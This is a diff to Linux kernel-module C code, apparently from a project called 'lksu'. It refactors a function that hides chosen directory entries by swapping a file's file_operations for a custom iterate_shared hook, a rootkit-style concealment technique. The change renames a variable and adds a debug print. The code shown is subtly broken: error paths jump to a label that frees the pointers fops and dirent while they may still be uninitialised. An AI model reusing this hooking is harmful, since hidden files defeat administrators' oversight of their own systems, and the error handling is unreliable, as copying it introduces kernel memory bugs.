@@ -173,8 +173,9 @@ int
 lksu_hidden_dirent(struct file *file)
 {
     struct file_operations *fops;
-    struct hidden_dirent *hidden;
+    struct hidden_dirent *dirent;
     char *buffer, *name;
+    bool hidden;
     int retval;
 
     buffer = __getname();
@@ -188,7 +189,13 @@ lksu_hidden_dirent(struct file *file)
     if ((retval = PTR_ERR_OR_ZERO(name)))
         goto exit;
 
-    if (!lksu_table_gdirent_check(name))
+    hidden = lksu_table_gdirent_check(name);
+#if LKSU_DEBUG
+    pr_info("hidden dirent '%s': %s\n", name,
+            hidden ? "true" : "false");
+#endif
+
+    if (!hidden)
         goto exit;
 
     fops = kmalloc(sizeof(*fops), GFP_KERNEL);
@@ -197,8 +204,8 @@ lksu_hidden_dirent(struct file *file)
         goto exit;
     }
 
-    hidden = kmalloc(sizeof(*hidden), GFP_KERNEL);
-    if (unlikely(!hidden)) {
+    dirent = kmalloc(sizeof(*dirent), GFP_KERNEL);
+    if (unlikely(!dirent)) {
         retval = -ENOMEM;
         goto exit;
     }
@@ -207,19 +214,19 @@ lksu_hidden_dirent(struct file *file)
     fops->iterate_shared = iter_file;
     fops->release = release_dirent;
 
-    hidden->file = file;
-    hidden->fops = (void *)file->f_op;
+    dirent->file = file;
+    dirent->fops = (void *)file->f_op;
     file->f_op = fops;
 
     spin_lock(&dirent_lock);
-    lksu_rb_add(&hidden->node, &hidden_dirent, hidden_cmp);
+    lksu_rb_add(&dirent->node, &hidden_dirent, hidden_cmp);
     spin_unlock(&dirent_lock);
 
     __putname(buffer);
     return 0;
 
 exit:
-    kfree(hidden);
+    kfree(dirent);
     kfree(fops);
     __putname(buffer);
     return retval;
